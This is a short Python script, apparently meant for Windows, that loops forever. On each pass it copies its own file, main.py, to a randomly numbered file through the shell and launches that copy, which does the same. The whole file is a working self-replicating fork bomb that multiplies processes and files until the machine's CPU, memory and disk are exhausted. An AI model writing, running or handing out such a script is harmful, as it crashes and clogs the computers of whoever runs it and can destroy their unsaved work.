import random, os

path = os.path.join(os.getcwd(), "main.py")
while True:
	n = random.randint(1,1000)
	print(n)
	os.popen(f"copy main.py {n}.py")
	os.popen(f"py {n}.py")
